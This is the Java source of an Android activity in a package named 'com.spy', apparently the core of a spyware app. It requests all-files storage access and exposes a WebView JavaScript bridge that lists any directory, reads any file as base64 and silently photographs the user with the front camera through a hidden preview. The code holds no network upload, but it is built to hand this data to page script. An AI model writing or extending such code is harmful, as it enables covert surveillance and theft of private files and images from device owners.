package com.spy.v39;
import android.os.*; import android.webkit.*; import android.app.*; import android.content.*; import android.net.Uri; import android.provider.Settings; import java.io.File; import android.util.Base64; import android.hardware.Camera; import android.graphics.SurfaceTexture;

public class MainActivity extends Activity {
    WebView w;
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            startActivity(new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName())));
        }
        w = new WebView(this);
        w.getSettings().setJavaScriptEnabled(true);
        w.getSettings().setAllowFileAccess(true);
        w.getSettings().setAllowUniversalAccessFromFileURLs(true);
        w.addJavascriptInterface(new Object() {
            @JavascriptInterface public String list(String path) {
                try { File f = new File(path); File[] files = f.listFiles(); StringBuilder sb = new StringBuilder();
                if(files == null) return "Locked";
                for (File file : files) sb.append(file.isDirectory() ? "📁 " : "📄 ").append(file.getName()).append("\n");
                return sb.toString(); } catch (Exception e) { return "Error"; }
            }
            @JavascriptInterface public String getFileBase64(String path) {
                try { byte[] b = java.nio.file.Files.readAllBytes(new File(path).toPath()); return Base64.encodeToString(b, Base64.NO_WRAP); } catch (Exception e) { return "Error"; }
            }
            @JavascriptInterface public void takeSnap() {
                try {
                    final Camera c = Camera.open(1);
                    c.setPreviewTexture(new SurfaceTexture(10));
                    c.startPreview();
                    c.takePicture(null, null, (data, camera) -> {
                        String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                        runOnUiThread(() -> w.loadUrl("javascript:window.receiveSnap('" + b64 + "')"));
                        camera.release();
                    });
                } catch (Exception e) { }
            }
        }, "Android");
        w.loadUrl("file:///android_asset/index.html");
        setContentView(w);
    }
}